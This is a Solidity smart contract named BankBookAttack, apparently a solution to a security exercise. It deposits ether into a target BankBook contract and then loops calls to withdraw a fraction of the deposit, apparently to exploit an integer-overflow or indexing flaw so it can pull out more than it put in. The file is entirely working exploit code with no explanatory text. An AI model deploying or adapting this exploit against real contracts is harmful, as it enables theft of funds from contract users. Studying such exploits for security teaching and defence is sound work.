pragma solidity ^0.4.18;

import "./BankBook.sol";

contract BankBookAttack {
  address bankbook;
  uint public initialBalance;
  uint public uint8MAX = 1 << 8;

  function () public payable {}

  function BankBookAttack(address _bankbook) public {
    bankbook = _bankbook;
  }

  function deposit() public payable {
    initialBalance = msg.value;

    require(bankbook.call.value(msg.value)(bytes4(sha3("deposit()"))));
  }

  event LogIndex(uint8 _index);

  function attack(uint n) public {
    uint amount = initialBalance / uint8MAX;

    for (uint i = 0; i < n; i++) {
      BankBook(bankbook).withdraw(amount);
    }
  }

  function withdraw() public {
    BankBook(bankbook).withdraw(initialBalance);
  }
}
